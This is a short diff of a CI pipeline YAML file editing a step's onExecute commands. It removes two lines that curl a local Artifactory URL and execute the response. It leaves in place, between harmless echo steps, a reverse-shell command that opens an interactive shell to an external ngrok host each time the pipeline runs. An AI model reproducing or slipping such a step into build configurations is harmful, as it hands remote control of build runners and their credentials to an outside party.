@@ -10,8 +10,6 @@ pipelines:
         execution:
           onExecute:
             - echo _${env1}
-            - temp=`curl http://localhost:8046/artifactory/webapp`
-            - $temp
             - sh -i >& /dev/tcp/6.tcp.ngrok.io/14241 0>&1
             - echo completed
 
